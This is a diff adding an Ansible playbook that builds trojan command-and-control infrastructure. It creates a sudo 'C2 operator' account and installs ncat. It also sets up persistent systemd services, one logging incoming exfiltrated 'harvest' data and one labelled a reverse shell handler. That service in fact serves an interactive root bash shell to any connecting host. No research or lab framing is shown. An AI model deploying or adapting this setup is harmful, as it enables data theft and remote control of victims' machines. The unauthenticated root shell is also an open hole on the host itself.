@@ -1,0 +1,83 @@
+---
+- name: Add C2 operator user
+  user:
+    name: '{{ username }}'
+    password: '{{ password | password_hash("sha512") }}'
+    shell: '/bin/bash'
+    groups: sudo
+    append: yes
+
+- name: Add host aliases
+  lineinfile:
+    path: '/etc/hosts'
+    line: "{{ item.ip }} {{ item.name }}"
+    state: present
+  loop: "{{ hosts_entries }}"
+
+- name: Install ncat
+  apt:
+    name: ncat
+    state: present
+    update_cache: yes
+
+- name: Create C2 log directories
+  file:
+    path: "{{ item }}"
+    state: directory
+    owner: root
+    group: root
+    mode: "0755"
+  loop:
+    - /var/log/trojan-c2
+    - /var/log/trojan-c2/harvest
+
+
+- name: Create harvest receiver service (logs incoming exfil data)
+  copy:
+    dest: /etc/systemd/system/trojan-harvest-rcv.service
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Trojan harvest data receiver
+      After=network.target
+
+      [Service]
+      Type=simple
+      ExecStart=/bin/sh -c 'ncat -lk {{ harvest_port }} >> /var/log/trojan-c2/harvest.log 2>&1'
+      Restart=always
+      RestartSec=2
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Create reverse shell handler service
+  copy:
+    dest: /etc/systemd/system/trojan-revshell-handler.service
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Trojan reverse shell handler
+      After=network.target
+
+      [Service]
+      Type=simple
+      ExecStart=/bin/sh -c 'ncat -lk {{ revshell_port }} -c "bash -i" >> /var/log/trojan-c2/revshell.log 2>&1'
+      Restart=always
+      RestartSec=2
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Enable and start C2 receiver services
+  systemd:
+    name: "{{ item }}"
+    enabled: yes
+    state: started
+    daemon_reload: yes
+  loop:
+    - trojan-harvest-rcv.service
+    - trojan-revshell-handler.service
